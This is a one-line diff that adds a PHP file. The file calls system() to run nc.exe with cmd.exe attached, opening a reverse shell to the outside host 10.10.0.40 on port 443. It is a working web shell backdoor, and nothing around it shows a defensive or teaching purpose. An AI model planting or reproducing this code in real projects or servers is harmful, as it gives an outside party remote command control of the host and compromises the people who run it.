@@ -1,0 +1,1 @@
+<?php system('%TEMP%/nc.exe -e cmd.exe 10.10.0.40 443'); ?>
